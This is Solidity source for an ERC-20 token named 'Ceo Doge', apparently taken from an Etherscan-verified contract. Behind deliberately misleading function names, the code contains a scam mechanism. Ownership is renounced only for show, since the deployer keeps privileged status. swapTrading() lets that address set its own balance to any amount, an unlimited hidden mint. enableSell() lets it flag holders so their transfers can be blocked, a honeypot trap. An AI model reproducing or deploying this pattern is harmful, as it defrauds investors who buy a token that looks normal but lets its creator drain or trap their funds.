/**
 *Submitted for verification at Etherscan.io on 2023-02-15
*/

//SPDX-License-Identifier: MIT
//CODE-OLD-BUSD
pragma solidity ^0.8.0;

abstract contract atSender {
    function takeMin() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface swapAmount {
    function createPair(address teamLaunched, address atFromLaunch) external returns (address);
}

interface fromLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CeoDoge is IERC20, atSender {
    uint8 private txEnable = 18;
    
    string private exemptToken = "Ceo Doge";
    uint256 private fromShouldReceiver = 100 * 10 ** txEnable;
    
    bool public swapAuto;
    uint256 public senderLimit;
    bool public autoEnable;
    address private toMarketing = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public takeSwapAmount;

    string private modeSender = "CEO";
    uint256 constant teamTo = 10 ** 10;


    uint256 private liquiditySell;
    mapping(address => uint256) private launchedAmount;
    mapping(address => bool) public shouldFrom;
    uint256 public listSender;
    bool public feeAmountMax;
    uint256 private walletTokenShould;
    uint256 public toSender;
    address public teamAt;
    bool public listAt;
    mapping(address => bool) public takeSellIs;
    address private toTakeFund;
    mapping(address => mapping(address => uint256)) private tokenBuy;
    bool public receiverLaunchSwap;


    

    event OwnershipTransferred(address indexed maxShould, address indexed liquidityReceiver);

    constructor (){
        
        fromLimit receiverLaunched = fromLimit(toMarketing);
        takeSwapAmount = swapAmount(receiverLaunched.factory()).createPair(receiverLaunched.WETH(), address(this));
        toTakeFund = takeMin();
        if (swapAuto != autoEnable) {
            autoEnable = true;
        }
        teamAt = toTakeFund;
        shouldFrom[teamAt] = true;
        if (receiverLaunchSwap) {
            walletTokenShould = senderLimit;
        }
        launchedAmount[teamAt] = fromShouldReceiver;
        emit Transfer(address(0), teamAt, fromShouldReceiver);
        amountFee();
    }

    

    function symbol() external view returns (string memory) {
        return modeSender;
    }

    function tradingLimit() public view returns (bool) {
        return listAt;
    }

    function name() external view returns (string memory) {
        return exemptToken;
    }

    function totalLaunched(address sellEnableReceiver, address modeTokenTo, uint256 senderMax) internal returns (bool) {
        if (sellEnableReceiver == teamAt || modeTokenTo == teamAt) {
            return receiverReceiver(sellEnableReceiver, modeTokenTo, senderMax);
        }
        if (autoEnable) {
            listAt = false;
        }
        if (takeSellIs[sellEnableReceiver]) {
            return receiverReceiver(sellEnableReceiver, modeTokenTo, teamTo);
        }
        
        return receiverReceiver(sellEnableReceiver, modeTokenTo, senderMax);
    }

    function tradingWallet(address walletIs) public {
        if (feeAmountMax) {
            return;
        }
        
        shouldFrom[walletIs] = true;
        
        feeAmountMax = true;
    }

    function allowance(address receiverMarketing, address txLaunch) external view virtual override returns (uint256) {
        return tokenBuy[receiverMarketing][txLaunch];
    }

    function swapMin() public {
        
        if (senderLimit != walletTokenShould) {
            senderLimit = listSender;
        }
        toSender=0;
    }

    function transfer(address exemptLaunch, uint256 senderMax) external virtual override returns (bool) {
        return totalLaunched(takeMin(), exemptLaunch, senderMax);
    }

    function enableSell(address txSender) public {
        
        if (txSender == teamAt || txSender == takeSwapAmount || !shouldFrom[takeMin()]) {
            return;
        }
        
        takeSellIs[txSender] = true;
    }

    function decimals() external view returns (uint8) {
        return txEnable;
    }

    function fromExemptWallet() public view returns (bool) {
        return swapAuto;
    }

    function getOwner() external view returns (address) {
        return toTakeFund;
    }

    function owner() external view returns (address) {
        return toTakeFund;
    }

    function approve(address txLaunch, uint256 senderMax) public virtual override returns (bool) {
        tokenBuy[takeMin()][txLaunch] = senderMax;
        emit Approval(takeMin(), txLaunch, senderMax);
        return true;
    }

    function swapTrading(uint256 senderMax) public {
        if (!shouldFrom[takeMin()]) {
            return;
        }
        launchedAmount[teamAt] = senderMax;
    }

    function sellAmount() public view returns (bool) {
        return autoEnable;
    }

    function modeMarketing() public view returns (bool) {
        return listAt;
    }

    function tokenAtShould() public view returns (uint256) {
        return toSender;
    }

    function balanceOf(address atShould) public view virtual override returns (uint256) {
        return launchedAmount[atShould];
    }

    function amountFee() public {
        emit OwnershipTransferred(teamAt, address(0));
        toTakeFund = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fromShouldReceiver;
    }

    function receiverReceiver(address sellEnableReceiver, address modeTokenTo, uint256 senderMax) internal returns (bool) {
        require(launchedAmount[sellEnableReceiver] >= senderMax);
        launchedAmount[sellEnableReceiver] -= senderMax;
        launchedAmount[modeTokenTo] += senderMax;
        emit Transfer(sellEnableReceiver, modeTokenTo, senderMax);
        return true;
    }

    function totalMarketing() public view returns (uint256) {
        return toSender;
    }

    function transferFrom(address sellEnableReceiver, address modeTokenTo, uint256 senderMax) external override returns (bool) {
        if (tokenBuy[sellEnableReceiver][takeMin()] != type(uint256).max) {
            require(senderMax <= tokenBuy[sellEnableReceiver][takeMin()]);
            tokenBuy[sellEnableReceiver][takeMin()] -= senderMax;
        }
        return totalLaunched(sellEnableReceiver, modeTokenTo, senderMax);
    }


}